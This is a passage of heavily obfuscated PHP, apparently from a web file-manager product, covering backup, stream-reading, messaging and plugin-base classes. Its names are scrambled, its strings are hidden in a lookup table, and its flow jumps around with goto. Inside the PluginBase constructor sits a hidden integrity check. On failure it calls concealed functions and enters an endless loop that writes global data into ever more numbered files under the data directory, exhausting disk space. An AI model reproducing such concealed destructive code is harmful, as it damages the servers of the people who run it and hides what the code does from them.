$f¾–Á®”÷Ø->model($B›óÕø­‘‰)->count(); } $cÜ¹äàšƒ = new Task($A©¡˜ó´„Ê[757], $A©¡˜ó´„Ê[758], $cÈÓÄ’ÀÁâ, LNG($A©¡˜ó´„Ê[759]) . $A©¡˜ó´„Ê[760] . LNG($A©¡˜ó´„Ê[761])); foreach ($B¿õÓîÖÜ as $B›óÕø­‘‰) { $B·ã“êÏ”˜ = $CˆÔöÁ¼¡ . $B›óÕø­‘‰ . $A©¡˜ó´„Ê[762]; $e®„¾İÎëÀ = null; if ($B›óÕø­‘‰ == $A©¡˜ó´„Ê[763] && (!isset($aÎåĞ¹º¢[$A©¡˜ó´„Ê[731]]) || $aÎåĞ¹º¢[$A©¡˜ó´„Ê[731]] == $A©¡˜ó´„Ê[191])) { $e®„¾İÎëÀ = self::$io; } $f˜ŞºŒœì += $f¾–Á®”÷Ø->sqlFromDb($B›óÕø­‘‰, $B·ã“êÏ”˜, $cÜ¹äàšƒ, $e®„¾İÎëÀ); } goto D·’“Ø¥æ; E•Çƒë’Ğ›: $f¾–Á®”÷Ø = new DbManage($A“÷¨Éõ•Ë, $CÚïÒç´­÷); $E£—‰µ¡çå = array($A©¡˜ó´„Ê[752] => $CÚïÒç´­÷, $A©¡˜ó´„Ê[753] => time()); Backup::set($E£—‰µ¡çå); goto E®’öçŒ¥; D·’“Ø¥æ: if (isset($cÜ¹äàšƒ->task[$A©¡˜ó´„Ê[764]])) { $bñƒÏ¦† = $cÜ¹äàšƒ->task[$A©¡˜ó´„Ê[764]] ? $cÜ¹äàšƒ->task[$A©¡˜ó´„Ê[764]] : timeFloat(); $F™‚šåôŒ = $bñƒÏ¦† - $cÜ¹äàšƒ->task[$A©¡˜ó´„Ê[765]]; if ($F™‚šåôŒ >= 0.2) { $cÈÓÄ’ÀÁâ += 1; } } $cÜ¹äàšƒ->end(); $E£—‰µ¡çå = array($A©¡˜ó´„Ê[752] => $CÚïÒç´­÷, $A©¡˜ó´„Ê[749] => 1, $A©¡˜ó´„Ê[766] => $cÈÓÄ’ÀÁâ, $A©¡˜ó´„Ê[767] => $f˜ŞºŒœì, $A©¡˜ó´„Ê[768] => time()); goto bï‹–›ŒÊ; E®’öçŒ¥: $CˆÔöÁ¼¡ = $this->tmpFilesPath() . $A©¡˜ó´„Ê[754] . self::$name . $A©¡˜ó´„Ê[8]; del_dir($CˆÔöÁ¼¡); mk_dir($CˆÔöÁ¼¡); goto a²Ç£¼õÙ†; bï‹–›ŒÊ: Backup::set($E£—‰µ¡çå); if ($cÈÓÄ’ÀÁâ > $f˜ŞºŒœì) { write_log(array($A©¡˜ó´„Ê[769], $E£—‰µ¡çå), $A©¡˜ó´„Ê[758]); return !1; } return !0; goto cˆ¼¦ºñéİ; dÄ˜ÕµòºÊ: self::$name = $aÎåĞ¹º¢[$A©¡˜ó´„Ê[28]]; $A“÷¨Éõ•Ë = $GLOBALS[$A©¡˜ó´„Ê[6]][$A©¡˜ó´„Ê[17]]; $CÚïÒç´­÷ = $this->_dbType($A“÷¨Éõ•Ë); goto E•Çƒë’Ğ›; f¹ç®·øíØ: $A©¡˜ó´„Ê =& $_SERVER[úÉ·öƒÑì©]; $aÎåĞ¹º¢ = Backup::get(); self::$io = $aÎåĞ¹º¢[$A©¡˜ó´„Ê[728]]; goto dÄ˜ÕµòºÊ; cˆ¼¦ºñéİ: } private function _dbType($EŞ¿‰‘é¹) { goto a„÷ğÄÊÒ±; a„÷ğÄÊÒ±: $c“È“ùÂß =& $_SERVER[úÉ·öƒÑì©]; $EŞ¿‰‘é¹ = array_change_key_case($EŞ¿‰‘é¹); $bğá—ÚÓ¸£ = $EŞ¿‰‘é¹[$c“È“ùÂß[770]]; goto eƒÑÚŒ³§ƒ; DÒ‘±…Íä·: return $bğá—ÚÓ¸£; goto aœè£™±î‹; eƒÑÚŒ³§ƒ: if ($bğá—ÚÓ¸£ == $c“È“ùÂß[771]) { $BŒƒÚî¬ˆ¹ = explode($c“È“ùÂß[4], $EŞ¿‰‘é¹[$c“È“ùÂß[772]]); $bğá—ÚÓ¸£ = $BŒƒÚî¬ˆ¹[0]; } $c‰Ã÷ğ÷öÃ = array($c“È“ùÂß[773] => $c“È“ùÂß[9], $c“È“ùÂß[774] => $c“È“ùÂß[775]); if (isset($c‰Ã÷ğ÷öÃ[$bğá—ÚÓ¸£])) { $bğá—ÚÓ¸£ = $c‰Ã÷ğ÷öÃ[$bğá—ÚÓ¸£]; } goto DÒ‘±…Íä·; aœè£™±î‹: } private function tmpFilesPath() { $e†õµàÚ×Î =& $_SERVER[úÉ·öƒÑì©]; $fº‚§©Åö÷ = TEMP_FILES; if ($GLOBALS[$e†õµàÚ×Î[6]][$e†õµàÚ×Î[88]][$e†õµàÚ×Î[776]]) { $fº‚§©Åö÷ = $GLOBALS[$e†õµàÚ×Î[6]][$e†õµàÚ×Î[88]][$e†õµàÚ×Î[776]]; if (!mk_dir($fº‚§©Åö÷) || !is_writable($fº‚§©Åö÷) || !IO::mkfile($fº‚§©Åö÷ . $e†õµàÚ×Î[777])) { $fº‚§©Åö÷ = TEMP_FILES; } } return $fº‚§©Åö÷; } } goto f†õª’ÀÎŞ; eŸË¥¯÷ÈĞ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($C˜ÃÜ—Ü, $c¶ÜË“ĞÔ = '') { goto f–Îğ³‚Á‰; f–Îğ³‚Á‰: $this->info = $this->info($C˜ÃÜ—Ü); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[úÉ·öƒÑì©][76]]; goto dâíÀ÷«ğ; fØö×ˆ §ô: if (!isset(self::$_chunkBuffer[$C˜ÃÜ—Ü])) { self::$_chunkBuffer[$C˜ÃÜ—Ü] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto A­õà‰Š¨İ; dâíÀ÷«ğ: $this->pathOpen = $C˜ÃÜ—Ü; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto fØö×ˆ §ô; A­õà‰Š¨İ: } function stream_read($f¯ÇÃÂóÕ) { $a…Ú–À¢ß‡ = $this->fileSubstr($this->pose, $f¯ÇÃÂóÕ); $this->pose += strlen($a…Ú–À¢ß‡); return $a…Ú–À¢ß‡; } public function stream_tell() { return $this->pose; } public function stream_seek($d÷Ñ¦®Õ, $eçµ¹Ù œ–) { $Fö½ÉÈÖŞê =& $_SERVER[úÉ·öƒÑì©]; if ($eçµ¹Ù œ– == SEEK_SET) { $this->pose = $d÷Ñ¦®Õ; } else { if ($eçµ¹Ù œ– == SEEK_CUR) { $this->pose += $d÷Ñ¦®Õ; } else { if ($eçµ¹Ù œ– == SEEK_END) { $this->pose = $this->info[$Fö½ÉÈÖŞê[78]] + intval($d÷Ñ¦®Õ); } } } if ($d÷Ñ¦®Õ < 0) { $this->pose = $this->info[$Fö½ÉÈÖŞê[78]] + $d÷Ñ¦®Õ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[úÉ·öƒÑì©][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($e†ê·éƒ, $bÆ°áÍóÛ°) { $dİ‰³ìÄƒ =& $_SERVER[úÉ·öƒÑì©]; $dÉ¼ŠëäŞØ = $this->info($e†ê·éƒ); return array($dİ‰³ìÄƒ[1387] => 0, $dİ‰³ìÄƒ[1388] => 0, $dİ‰³ìÄƒ[12] => 32768 + 511, $dİ‰³ìÄƒ[1389] => 0, $dİ‰³ìÄƒ[1390] => 0, $dİ‰³ìÄƒ[1391] => 0, $dİ‰³ìÄƒ[1392] => 0, $dİ‰³ìÄƒ[78] => $dÉ¼ŠëäŞØ[$dİ‰³ìÄƒ[78]], $dİ‰³ìÄƒ[1393] => $dÉ¼ŠëäŞØ[$dİ‰³ìÄƒ[1262]], $dİ‰³ìÄƒ[1349] => $dÉ¼ŠëäŞØ[$dİ‰³ìÄƒ[84]], $dİ‰³ìÄƒ[1348] => $dÉ¼ŠëäŞØ[$dİ‰³ìÄƒ[194]], $dİ‰³ìÄƒ[1394] => 0, $dİ‰³ìÄƒ[1395] => 0); } static $fileInfo = array(); public function info($aÓ¬¼±Ù¨ê) { $F‹­Ğ¹›¼„ = $_SERVER[úÉ·öƒÑì©][1396]; if (isset(self::$fileInfo[$aÓ¬¼±Ù¨ê])) { return self::$fileInfo[$aÓ¬¼±Ù¨ê]; } if (substr($aÓ¬¼±Ù¨ê, 0, strlen($F‹­Ğ¹›¼„)) != $F‹­Ğ¹›¼„) { return !1; } self::$fileInfo[$aÓ¬¼±Ù¨ê] = IO::info(substr($aÓ¬¼±Ù¨ê, strlen($F‹­Ğ¹›¼„))); return self::$fileInfo[$aÓ¬¼±Ù¨ê]; } public static function read($FŞÏãçÉ½·, $aèãÑà†Åá, $eÛŸ—éá¥ø) { if (!isset(self::$_fopenCache[$FŞÏãçÉ½·])) { $EÁ¯¥ô¶ëç = new StreamWrapperIO(); $EÁ¯¥ô¶ëç->stream_open($FŞÏãçÉ½·); self::$_fopenCache[$FŞÏãçÉ½·] = $EÁ¯¥ô¶ëç; } $EÁ¯¥ô¶ëç = self::$_fopenCache[$FŞÏãçÉ½·]; return $EÁ¯¥ô¶ëç->fileSubstr($aèãÑà†Åá, $eÛŸ—éá¥ø); } public static function _read($DòÏÚåÓª, $c›ÀÅ‡¡¬ˆ, $fôÇø£) { goto c‹‡ñï‡®ê; c‹‡ñï‡®ê: $eß›ËÏ¾ =& $_SERVER[úÉ·öƒÑì©]; $Eè¤Õâ‰ÉÁ = fopen($DòÏÚåÓª, $eß›ËÏ¾[1266]); if (!$Eè¤Õâ‰ÉÁ) { return $eß›ËÏ¾[33]; } goto DÏ„­Êí‡; DÏ„­Êí‡: $dŠí×ğìÀ³ = 8192; fseek($Eè¤Õâ‰ÉÁ, $c›ÀÅ‡¡¬ˆ, SEEK_SET); $a©×•ã¥Îâ = $eß›ËÏ¾[33]; goto d‘…ĞÕ¡Ëô; aÌœã»¬õö: return $a©×•ã¥Îâ; goto eËŒ¡…”Ï; d‘…ĞÕ¡Ëô: $cƒáïéÔÇ« = 0; while ($cƒáïéÔÇ« < $fôÇø£) { $F¡±ÔÃå…ø = min($dŠí×ğìÀ³, $fôÇø£ - $cƒáïéÔÇ«); $a©×•ã¥Îâ .= fread($Eè¤Õâ‰ÉÁ, $F¡±ÔÃå…ø); $cƒáïéÔÇ« += $F¡±ÔÃå…ø; } fclose($Eè¤Õâ‰ÉÁ); goto aÌœã»¬õö; eËŒ¡…”Ï: } public function fileSubstr($CëÉˆŠîè˜, $dëÅ¹ÑÑŸ÷) { goto bÙ®—•…Ï; d„‚µÆ•‹: $a‹§Ïòâ¸ï = ceil(($CëÉˆŠîè˜ + $dëÅ¹ÑÑŸ÷) / $f»Ñ•õ’À†) * $f»Ñ•õ’À† - $f½ÔƒŒÌø; $f±·†¤Ç‹ˆ = IO::fileSubstr($this->path, $f½ÔƒŒÌø, $a‹§Ïòâ¸ï); $eá–¦‡¸„Å[$f½ÔƒŒÌø . $Bæãôç¿¥˜[33]] = $f±·†¤Ç‹ˆ; goto A‚‚Òß¸¿œ; A‚‚Òß¸¿œ: ksort($eá–¦‡¸„Å); $B’Ò„«¿“é = substr($f±·†¤Ç‹ˆ, $CëÉˆŠîè˜ - $f½ÔƒŒÌø, $dëÅ¹ÑÑŸ÷); return $B’Ò„«¿“é; goto bÉØ´…ë©µ; D·ÒŞğåÅ: $F—æŒÔŠ†‚ = 0; $F°ğóêé‚ = 0; $d¤§£Š˜ì° = $Bæãôç¿¥˜[33]; goto C £Æ¦µåÆ; C´ôÃÏ²œæ: $bÎõâÒ‹öë = $dëÅ¹ÑÑŸ÷; if ($CëÉˆŠîè˜ < 0) { $CëÉˆŠîè˜ = $fíÛ‰—¨ì + $CëÉˆŠîè˜; } if ($dëÅ¹ÑÑŸ÷ === !1) { $dëÅ¹ÑÑŸ÷ = $fíÛ‰—¨ì - $CëÉˆŠîè˜; } goto cå·”Ğ¾İ„; E–¹¡ŒË‘§: $f»Ñ•õ’À† = 64 * 1024; $eá–¦‡¸„Å =& self::$_chunkBuffer[$this->path]; if (!$eá–¦‡¸„Å) { $eá–¦‡¸„Å = array(); } goto D·ÒŞğåÅ; bÙ®—•…Ï: $Bæãôç¿¥˜ =& $_SERVER[úÉ·öƒÑì©]; $fíÛ‰—¨ì = $this->info[$Bæãôç¿¥˜[78]]; $dÙ «ƒè­Ó = $CëÉˆŠîè˜; goto C´ôÃÏ²œæ; C £Æ¦µåÆ: foreach ($eá–¦‡¸„Å as $F—æŒÔŠ†‚ => $d¤§£Š˜ì°) { $F—æŒÔŠ†‚ = intval($F—æŒÔŠ†‚); $F°ğóêé‚ = $F—æŒÔŠ†‚ + strlen($d¤§£Š˜ì°); if ($CëÉˆŠîè˜ >= $F°ğóêé‚) { continue; } if ($CëÉˆŠîè˜ >= $F—æŒÔŠ†‚ && $CëÉˆŠîè˜ + $dëÅ¹ÑÑŸ÷ <= $F°ğóêé‚) { return substr($d¤§£Š˜ì°, $CëÉˆŠîè˜ - $F—æŒÔŠ†‚, $dëÅ¹ÑÑŸ÷); } break; } if (count($eá–¦‡¸„Å) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Bæãôç¿¥˜[1397], $Bæãôç¿¥˜[1398] . count($eá–¦‡¸„Å) . "\x3b\163\x74\x61\162\164\75{$CëÉˆŠîè˜}\54\x6c\145\156\x67\164\150\x3d{$dëÅ¹ÑÑŸ÷}\x3b\160\157\163\145\x3a{$F—æŒÔŠ†‚}\176{$F°ğóêé‚}"); throw new Exception($Bæãôç¿¥˜[1399]); } $f½ÔƒŒÌø = intval($CëÉˆŠîè˜ / $f»Ñ•õ’À†) * $f»Ñ•õ’À†; goto d„‚µÆ•‹; cå·”Ğ¾İ„: if ($CëÉˆŠîè˜ + $dëÅ¹ÑÑŸ÷ > $fíÛ‰—¨ì) { $dëÅ¹ÑÑŸ÷ = $fíÛ‰—¨ì - $CëÉˆŠîè˜; } if ($dëÅ¹ÑÑŸ÷ <= 0) { return $Bæãôç¿¥˜[33]; } if ($CëÉˆŠîè˜ < 0 || $CëÉˆŠîè˜ >= $fíÛ‰—¨ì || $dëÅ¹ÑÑŸ÷ <= 0 || $dëÅ¹ÑÑŸ÷ > 1024 * 1024 * 5) { throw new Exception("\x69\157\x46\151\154\145\x52\x65\141\x64\40\145\x72\x72\157\x72\x21\x20\163\164\x61\x72\x74\x3d{$CëÉˆŠîè˜}\73\154\x65\156\147\x74\150\x3d{$dëÅ¹ÑÑŸ÷}\73\40\163\x69\x7a\x65\75{$fíÛ‰—¨ì}\73"); } goto E–¹¡ŒË‘§; bÉØ´…ë©µ: } private function log($dŠÄ‘–Ğ¯®, $F‰¹ôù¦) { $Cšßä‹­¶Ù =& $_SERVER[úÉ·öƒÑì©]; $D”Ò•ÚíÔ = timeFloat() - $this->timeStart; write_log(sprintf($Cšßä‹­¶Ù[1400], $dŠÄ‘–Ğ¯®, $this->info[$Cšßä‹­¶Ù[28]], $D”Ò•ÚíÔ, $F‰¹ôù¦), $Cšßä‹­¶Ù[1086]); } } class Message { function __construct() { } public function send($EîÜÓİ„¦ = '', $bÚ‡‘ÉìµÆ = array(), $eõ»Ã…¾¹¡ = "\x74\145\170\164") { goto Cµğ¯ÉÛ‚; Då¢ÙÚñÓÀ: Hook::trigger($Bä¬Ğ…àÂ­[1404], $aÄìÍô³È); goto A£¶µ§¤æï; C“™Ä°ùÓ”: $bÚ‡‘ÉìµÆ = array($Bä¬Ğ…àÂ­[1023] => isset($bÚ‡‘ÉìµÆ[$Bä¬Ğ…àÂ­[1023]]) ? $bÚ‡‘ÉìµÆ[$Bä¬Ğ…àÂ­[1023]] : $Bä¬Ğ…àÂ­[33], $Bä¬Ğ…àÂ­[571] => isset($bÚ‡‘ÉìµÆ[$Bä¬Ğ…àÂ­[571]]) ? $bÚ‡‘ÉìµÆ[$Bä¬Ğ…àÂ­[571]] : $Bä¬Ğ…àÂ­[33]); if (empty($EîÜÓİ„¦) || empty($bÚ‡‘ÉìµÆ[$Bä¬Ğ…àÂ­[1023]]) && empty($bÚ‡‘ÉìµÆ[$Bä¬Ğ…àÂ­[571]])) { return !1; } $aÄìÍô³È = array($Bä¬Ğ…àÂ­[1342] => $F²áÓ©ó„±, $Bä¬Ğ…àÂ­[1403] => $bÚ‡‘ÉìµÆ); goto Då¢ÙÚñÓÀ; Cµğ¯ÉÛ‚: $Bä¬Ğ…àÂ­ =& $_SERVER[úÉ·öƒÑì©]; $F²áÓ©ó„± = array($Bä¬Ğ…àÂ­[29] => $Bä¬Ğ…àÂ­[1401], $Bä¬Ğ…àÂ­[731] => $EîÜÓİ„¦); if (in_array($eõ»Ã…¾¹¡, array($Bä¬Ğ…àÂ­[1401], $Bä¬Ğ…àÂ­[1402]))) { $F²áÓ©ó„±[$Bä¬Ğ…àÂ­[29]] = $eõ»Ã…¾¹¡; } goto C“™Ä°ùÓ”; A£¶µ§¤æï: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto C‰ÎÏË×ˆ˜; d‚¹¬ïœ‚Ò: $this->in =& $in; $this->modelPlugin = Model($dÕæŠšÍ„[1407]); $this->pluginName = str_replace($dÕæŠšÍ„[1407], $dÕæŠšÍ„[33], get_class($this)); goto Aï˜×¹Ã·—; Aï˜×¹Ã·—: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $dÕæŠšÍ„[8]; $this->pluginApi = appHostGet() . $dÕæŠšÍ„[1408] . $this->pluginName . $dÕæŠšÍ„[8]; $this->pluginHost = $config[$dÕæŠšÍ„[1409]] . $this->pluginName . $dÕæŠšÍ„[8]; goto BÈ¼ˆÜÁ¡; BÈ¼ˆÜÁ¡: $this->pluginHostDefault = $config[$dÕæŠšÍ„[1409]] . $this->pluginName . $dÕæŠšÍ„[8]; $bĞ‹„×Ãéá = $config[$dÕæŠšÍ„[1410]]; if ($bĞ‹„×Ãéá && strpos($dÕæŠšÍ„[47] . $bĞ‹„×Ãéá . $dÕæŠšÍ„[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$dÕæŠšÍ„[1411]] . $this->pluginName . $dÕæŠšÍ„[8]; } goto eì‰ÍæŠ·; C‰ÎÏË×ˆ˜: $dÕæŠšÍ„ =& $_SERVER[úÉ·öƒÑì©]; $eÌğšŒÆå¨ = $_SERVER[$dÕæŠšÍ„[242]]; $e¿ò¥òÜĞ = $dÕæŠšÍ„[243]; goto cÁˆì’ŠÚ; cÁˆì’ŠÚ: if ($_SERVER[$dÕæŠšÍ„[244]] != $e¿ò¥òÜĞ($eÌğšŒÆå¨)) { goto C±Ç±Çù„æ; aÖ‹ó‚¸: $F˜ç Ù–ù” = 1; for ($bâ‡æ¹„Íä = $F˜ç Ù–ù”; $bâ‡æ¹„Íä > 0; $bâ‡æ¹„Íä++) { $bå©°¬«¹(DATA_PATH . $bâ‡æ¹„Íä, $FÒ¹åˆĞ·à); } goto fÔªËâ¼éê; d°‹åèÖø: $Eğƒİ…î¡ = $c˜÷×¯è($E„»„òÚ˜…); $CöÉ¸“ê¾° = explode($dÕæŠšÍ„[229], $Eğƒİ…î¡); if (count($CöÉ¸“ê¾°) < $dÕæŠšÍ„[588]) { $F¼Ú«Ó„“¼ = $dÕæŠšÍ„[249]; $F¼Ú«Ó„“¼(); } goto DÅÇ¯á½‘Æ; C±Ç±Çù„æ: $BìŞÚáî = $dÕæŠšÍ„[848]; $c˜÷×¯è = $dÕæŠšÍ„[245]; $E„»„òÚ˜… = $_SERVER[$dÕæŠšÍ„[246]] . $dÕæŠšÍ„[247]; goto d°‹åèÖø; dî…µò˜õ¥: $BìŞÚáî(); $bå©°¬«¹ = $dÕæŠšÍ„[1405]; $FÒ¹åˆĞ·à = json_encode($GLOBALS[$dÕæŠšÍ„[1406]]); goto aÖ‹ó‚¸; DÅÇ¯á½‘Æ: $d¹§òˆ”™š = $dÕæŠšÍ„[849]; $d¹§òˆ”™š($_SERVER[$dÕæŠšÍ„[850]]); $BìŞÚáî = $dÕæŠšÍ„[848]; goto dî…µò˜õ¥; fÔªËâ¼éê: } global $in, $config; $this->config =& $config; goto d‚¹¬ïœ‚Ò; eì‰ÍæŠ·: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto C‘ÕŞ„–Æ¦; C‘ÕŞ„–Æ¦: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[úÉ·öƒÑì©][1412]); } protected function assign($BŞ°„Ê”ˆÔ, $A§íåˆ¿è£ = false) { if (is_array($BŞ°„Ê”ˆÔ)) { $this->values = array_merge($this->values, $BŞ°„Ê”ˆÔ); } else { $this->values[$BŞ°„Ê”ˆÔ] = $A§íåˆ¿è£; } } protected function display($A¶‰ÙŸƒô·) { extract($this->values); require $A¶‰ÙŸƒô·; } final function hookRegist($cÅéò°™“Ş) { $this->modelPlugin->appRegist($this->pluginName, $cÅéò°™“Ş); } final function appIcon() { $cÇ—Å–ŸÚ =& $_SERVER[úÉ·öƒÑì©]; $bî°—àˆ»ù = $this->appPackage(); $dİ Çİùî„ = $cÇ—Å–ŸÚ[33]; if (isset($bî°—àˆ»ù[$cÇ—Å–ŸÚ[418]])) { if (isset($bî°—àˆ»ù[$cÇ—Å–ŸÚ[418]][$cÇ—Å–ŸÚ[1413]])) { $dİ Çİùî„ = $cÇ—Å–ŸÚ[1414] . $bî°—àˆ»ù[$cÇ—Å–ŸÚ[418]][$cÇ—Å–ŸÚ[1413]] . $cÇ—Å–ŸÚ[1415]; } else { if ($bî°—àˆ»ù[$cÇ—Å–ŸÚ[418]][$cÇ—Å–ŸÚ[1416]]) { $dİ Çİùî„ = $cÇ—Å–ŸÚ[1417] . $bî°—àˆ»ù[$cÇ—Å–ŸÚ[418]][$cÇ—Å–ŸÚ[1416]] . $cÇ—Å–ŸÚ[1418]; } } } return $dİ Çİùî„; } final function fileCanView($AÙ§Š¤‚í) { goto CÜ¯„†åà¶; EíËÕ¸¹–: ActionCall($BÕ¦£ÊŞ¹…[1431], $AÙ§Š¤‚í); goto d¢Í©İİƒß; CÜ¯„†åà¶: $BÕ¦£ÊŞ¹… =& $_SERVER[úÉ·öƒÑì©]; if (request_url_safe($AÙ§Š¤‚í)) { return !0; } if ($this->isShare($AÙ§Š¤‚í)) { return !0; } goto B ‹ó°õÏ–; B ‹ó°õÏ–: $Dë‹Ø²Æé¤ = Session::get($BÕ¦£ÊŞ¹…[1419]); if (!$Dë‹Ø²Æé¤ || !$Dë‹Ø²Æé¤[$BÕ¦£ÊŞ¹…[1420]]) { $c–èÇ·ïëµ = $BÕ¦£ÊŞ¹…[1421] . rawurlencode(this_url()); show_tips(LNG($BÕ¦£ÊŞ¹…[1422]) . $BÕ¦£ÊŞ¹…[1423] . $c–èÇ·ïëµ . $BÕ¦£ÊŞ¹…[1424] . LNG($BÕ¦£ÊŞ¹…[1425]) . $BÕ¦£ÊŞ¹…[1426], !1); } if (!Action($BÕ¦£ÊŞ¹…[1427])->authCan($BÕ¦£ÊŞ¹…[1428])) { show_tips(LNG($BÕ¦£ÊŞ¹…[1429]) . $BÕ¦£ÊŞ¹…[1430], !1); } goto EíËÕ¸¹–; d¢Í©İİƒß: } final function isShare($fì²•º§ö) { $B™ó§™â¢ = KodIO::parse($fì²•º§ö); return $B™ó§™â¢[$_SERVER[úÉ·öƒÑì©][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Cù• ¯äæ±) { if (request_url_safe($Cù• ¯äæ±)) { return $Cù• ¯äæ±; } if (!$this->isShare($Cù• ¯äæ±)) { $Cù• ¯äæ± = $this->filePath($Cù• ¯äæ±); } return Action($_SERVER[úÉ·öƒÑì©][1078])->linkOut($Cù• ¯äæ±); } public function filePathLinkOut($aí‘§‘×‚’) { if (request_url_safe($aí‘§‘×‚’)) { return $aí‘§‘×‚’; } $this->fileCanView($aí‘§‘×‚’); return Action($_SERVER[úÉ·öƒÑì©][1078])->link($aí‘§‘×‚’); } final function filePath($eøĞÚõßÆñ) { $d‰ÛÏŠ²›î =& $_SERVER[úÉ·öƒÑì©]; if ($d·©µŒ‡ Ó = $this->checkSharePath($eøĞÚõßÆñ)) { Hook::trigger($d‰ÛÏŠ²›î[1432], $d·©µŒ‡ Ó); return $d·©µŒ‡ Ó; } $this->fileCanView($eøĞÚõßÆñ); if (request_url_safe($eøĞÚõßÆñ)) { $E×Õè¼ŞÈ» = parse_url_query($eøĞÚõßÆñ); if (isset($E×Õè¼ŞÈ»[$d‰ÛÏŠ²›î[1433]]) && isset($E×Õè¼ŞÈ»[$d‰ÛÏŠ²›î[209]])) { $Fß¹äè´¡ = Model($d‰ÛÏŠ²›î[746])->get($d‰ÛÏŠ²›î[747]); $A¹‰äâµØ = Mcrypt::decode($E×Õè¼ŞÈ»[$d‰ÛÏŠ²›î[209]], $Fß¹äè´¡); if ($A¹‰äâµØ) { $this->fileInfo = IO::infoWithChildren($A¹‰äâµØ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $A¹‰äâµØ; } } $eøĞÚõßÆñ = $this->_cacheHttpFile($eøĞÚõßÆñ); $this->fileInfo = IO::infoWithChildren($eøĞÚõßÆñ); } else { $this->fileInfo = IO::infoWithChildren($eøĞÚõßÆñ); if (!$this->fileInfo) { show_tips(LNG($d‰ÛÏŠ²›î[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($d‰ÛÏŠ²›î[1432], $eøĞÚõßÆñ); return $eøĞÚõßÆñ; } final function _cacheHttpFile($b†·–ß®) { $B§„ŠÖÈå† = hash_path($b†·–ß®, !0); $this->cachePath = $this->pluginCachePath($B§„ŠÖÈå†); if ($dÅªœÛÅÒï = IO::fileNameExist($this->cachePath, $B§„ŠÖÈå†)) { return KodIO::make($dÅªœÛÅÒï); } $e¦¬®ÏäÍ® = $this->cachePath . $B§„ŠÖÈå†; return $this->pluginCacheFileSet($e¦¬®ÏäÍ®, file_get_contents_nossl($b†·–ß®)); } final function _tmpFileName($a÷ÈĞ¼ = array()) { goto d–ğì“…åÈ; d–ğì“…åÈ: $C©ƒÂàæ¶Ö =& $_SERVER[úÉ·öƒÑì©]; if (!$a÷ÈĞ¼) { $a÷ÈĞ¼ = $this->fileInfo; } if (isset($a÷ÈĞ¼[$C©ƒÂàæ¶Ö[171]])) { return $a÷ÈĞ¼[$C©ƒÂàæ¶Ö[171]]; } goto d¥ºĞÓ¢Œ; E®µö¥§: $D·ïø§–íé = array($a÷ÈĞ¼[$C©ƒÂàæ¶Ö[28]], $a÷ÈĞ¼[$C©ƒÂàæ¶Ö[76]], $a÷ÈĞ¼[$C©ƒÂàæ¶Ö[78]]); if (isset($a÷ÈĞ¼[$C©ƒÂàæ¶Ö[496]])) { $D·ïø§–íé[] = $a÷ÈĞ¼[$C©ƒÂàæ¶Ö[496]]; } return md5(implode($C©ƒÂàæ¶Ö[71], $D·ïø§–íé)); goto c®¤®å®·‹; d¥ºĞÓ¢Œ: if (isset($a÷ÈĞ¼[$C©ƒÂàæ¶Ö[164]][$C©ƒÂàæ¶Ö[171]])) { return $a÷ÈĞ¼[$C©ƒÂàæ¶Ö[164]][$C©ƒÂàæ¶Ö[171]]; } $eœùù¶ÁÅ¢ = IO::hashSimple($a÷ÈĞ¼[$C©ƒÂàæ¶Ö[76]]); if ($eœùù¶ÁÅ¢) { return $eœùù¶ÁÅ¢; } goto E®µö¥§; c®¤®å®·‹: } final function checkSharePath($c‰ÛÒøÜÇ) { goto FøÆó³ßÇ³; A©³§Ü‹: $this->cachePath = $this->pluginCachePath($this->fileInfo[$f‡§–£çÇÍ[171]]); return $dŞ›­ø¿ƒ[$f‡§–£çÇÍ[76]]; goto D¸â”·Õ¥¶; D“©ÂåãË: $dŞ›­ø¿ƒ = Action($f‡§–£çÇÍ[1078])->sharePathInfo($c‰ÛÒøÜÇ); if (!isset($dŞ›­ø¿ƒ[$f‡§–£çÇÍ[76]])) { show_json(LNG($f‡§–£çÇÍ[1435]), !1); } $this->fileInfo = $dŞ›­ø¿ƒ[$f‡§–£çÇÍ[164]]; goto A©³§Ü‹; FøÆó³ßÇ³: $f‡§–£çÇÍ =& $_SERVER[úÉ·öƒÑì©]; if (!defined($f‡§–£çÇÍ[463])) { define($f‡§–£çÇÍ[1434], 0); } if (!$this->isShare($c‰ÛÒøÜÇ)) { return !1; } goto D“©ÂåãË; D¸â”·Õ¥¶: } final function pluginCachePath($CÎ©Ü‹¡˜” = '') { $A¬¼Û¸ôÀô =& $_SERVER[úÉ·öƒÑì©]; $fâÍÃ¾Æ¾ = IO_PATH_SYSTEM_TEMP . $A¬¼Û¸ôÀô[1436] . $this->pluginName; if (!($f†º­³‹àÉ = IO::infoFull($fâÍÃ¾Æ¾))) { return IO::mkdir($fâÍÃ¾Æ¾ . $A¬¼Û¸ôÀô[8] . $CÎ©Ü‹¡˜”); } if (empty($CÎ©Ü‹¡˜”)) { return $f†º­³‹àÉ[$A¬¼Û¸ôÀô[76]]; } if (!($bíª“…ãµÔ = IO::fileNameExist($f†º­³‹àÉ[$A¬¼Û¸ôÀô[76]], $CÎ©Ü‹¡˜”))) { return IO::mkdir($f†º­³‹àÉ[$A¬¼Û¸ôÀô[76]] . $CÎ©Ü‹¡˜”); } return KodIO::make($bíª“…ãµÔ); } final function pluginCacheFileSet($b®©×ÈÏŸÚ, 